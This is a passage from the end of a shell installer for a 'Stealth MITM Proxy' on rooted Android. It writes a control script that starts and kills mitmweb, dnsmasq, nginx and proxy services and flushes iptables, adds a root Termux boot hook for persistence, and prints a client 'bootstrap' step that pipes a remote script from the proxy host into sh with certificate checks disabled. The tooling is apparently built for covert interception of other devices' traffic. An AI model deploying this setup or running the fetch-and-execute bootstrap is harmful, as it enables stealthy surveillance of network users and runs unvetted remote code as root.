            if [ -f "$f" ] && [ $(stat -c%s "$f" 2>/dev/null || echo 0) -gt 10485760 ]; then
                mv "$f" "${f}.old"
                touch "$f"
            fi
        done
    done
) &

log "All services started."
wait
RUNALL
chmod +x "$BASE_DIR/scripts/run_all.sh"

# ---------- mitm-ctl command with robust stop (process group kill) -----------
cat > "$BASE_DIR/bin/mitm-ctl" << 'CTL'
#!/system/bin/env bash
set -euo pipefail
BASE=/data/local/tmp/mitm_stealth
SCRIPT="$BASE/scripts/run_all.sh"

stop_services() {
    echo "Stopping all services..."
    # First try to find the PID of the run_all.sh supervisor
    local pid
    pid=$(pgrep -f "run_all.sh" | head -1)
    if [ -n "$pid" ]; then
        # kill the entire process group to terminate all children (watchdogs, proxies, etc.)
        kill -TERM -"$pid" 2>/dev/null || true
        sleep 1
        # if still alive, force kill
        kill -KILL -"$pid" 2>/dev/null || true
    fi

    # as a fallback, also kill individual service processes
    for svc in mitmweb dnsmasq nginx dot_proxy.py admin_ui.py update_ddns; do
        pkill -f "$svc" 2>/dev/null || true
    done

    # flush firewall rules
    iptables -t nat -F 2>/dev/null || true
    iptables -F 2>/dev/null || true
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
    echo "Stopped."
}

case "${1:-}" in
    start)
        if pgrep -f "run_all.sh" >/dev/null; then
            echo "Services already running."
            exit 0
        fi
        nohup bash "$SCRIPT" >/dev/null 2>&1 &
        echo "Started."
        ;;
    stop)
        stop_services
        ;;
    status)
        for s in mitmweb dnsmasq nginx dot_proxy.py; do
            if pgrep -f "$s" >/dev/null; then
                echo "$s: running"
            else
                echo "$s: stopped"
            fi
        done
        ;;
    panic)
        stop_services
        echo "Panic done. All rules and processes cleared."
        ;;
    *)
        echo "Usage: $0 {start|stop|status|panic}"
        exit 1
        ;;
esac
CTL
chmod +x "$BASE_DIR/bin/mitm-ctl"

# ---------- Termux boot integration (optional) -------------------------------
if [ -d "$HOME/.termux" ]; then
    mkdir -p "$HOME/.termux/boot/"
    cat > "$HOME/.termux/boot/start_mitm_stealth" << 'BOOT'
#!/data/data/com.termux/files/usr/bin/bash
termux-wake-lock
su -c "/data/local/tmp/mitm_stealth/scripts/run_all.sh"
BOOT
    chmod +x "$HOME/.termux/boot/start_mitm_stealth"
    info "Termux boot script created."
else
    warn "Termux directory not found. Add auto-start manually if needed."
fi

# ---------- final output -----------------------------------------------------
echo
echo "======================================"
echo " Stealth MITM Proxy installed."
echo "======================================"
echo " Web UI: https://${HOST1}:${WEBUI_HTTPS_PORT}/ or https://${HOST2}:${WEBUI_HTTPS_PORT}/"
echo " Login: ${WEBUI_USER} / ${WEBUI_PASS}"
echo ""
echo " Client bootstrap (run on rooted client after connecting):"
echo "   curl -k https://192.168.42.1:${WEBUI_HTTPS_PORT}/bootstrap | sh"
echo "   or download from the web UI."
echo ""
echo " Start: ${BASE_DIR}/scripts/run_all.sh"
echo " Control: ${BASE_DIR}/bin/mitm-ctl {start|stop|status|panic}"
echo "======================================"
